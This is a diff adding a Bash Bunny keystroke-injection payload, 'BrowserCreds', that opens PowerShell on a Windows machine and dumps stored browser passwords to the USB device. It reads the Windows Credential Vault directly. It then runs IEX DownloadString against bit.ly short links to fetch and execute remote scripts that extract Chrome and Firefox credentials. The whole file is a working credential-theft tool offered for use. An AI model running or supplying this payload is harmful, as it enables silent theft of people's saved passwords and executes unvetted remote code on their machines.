@@ -1,0 +1,77 @@
+#!/bin/bash
+#
+# Title:         BrowserCreds
+# Author:        illwill
+# Version:       0.1
+#
+# Dumps the stored plaintext Browser passwords from Windows boxes downloading a Powershell script
+# then stashes them in /root/udisk/loot/BrowserCreds/%ComputerName%
+# Credits to these guys for their powershell scripts:
+# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
+# https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
+
+#script 
+# Blue...............Running Script
+# Purple.............Got Browser Creds
+
+
+LED R 200
+LOOTDIR=/root/udisk/loot/BrowserCreds
+mkdir -p $LOOTDIR
+
+ATTACKMODE HID STORAGE
+LED B 200
+
+# wait 6 seconds for the storage to popup
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 500
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+
+#Dump Credential Vault (I.E./Edge)
+Q STRING \$ClassHolder \= \[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType\=WindowsRuntime\]\;
+Q STRING \$VaultObj \= new-object Windows.Security.Credentials.PasswordVault\; \$VaultObj.RetrieveAll\(\) \| 
+Q STRING foreach \{ \$_.RetrievePassword\(\)\; \$_ \} \|
+Q STRING select Resource, UserName, Password \| Sort-Object Resource \| ft -AutoSize \| Out-File \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
+Q ENTER
+Q DELAY 100
+
+#Dump Chrome Creds
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nea8tb\'\)\; Get-ChromeCreds \| ft UserURL\, Password -AutoSize \| Out-File -Append \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt -width 250
+Q ENTER
+Q DELAY 100
+Q STRING exit
+Q ENTER
+Q DELAY 2000
+
+
+#Open 32bit powershell and Dump Firefox Creds
+Q GUI r
+Q DELAY 100
+Q STRING \%SystemRoot\%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
+Q ENTER
+Q DELAY 2000
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2mLu0R3\'\)\; Get-FoxDump \| Out-File -Append \$Bunny\\loot\\BrowserCreds\\\$env:computername.txt
+Q ENTER
+Q DELAY 100
+Q STRING exit
+Q ENTER
+Q DELAY 100
+Q STRING Out-File -FilePath \$BUNNY\\loot\\BrowserCreds\\DONE
+Q ENTER
+Q DELAY 100
+sync
+LED R B 200
+
+FILE="/root/udisk/loot/BrowserCreds/DONE"
+while [ ! -e $FILE ]; do sleep 1; done;
+sleep 1;
+if [ -e $FILE ]; then rm -f $FILE; LED G 200; else LED R; fi
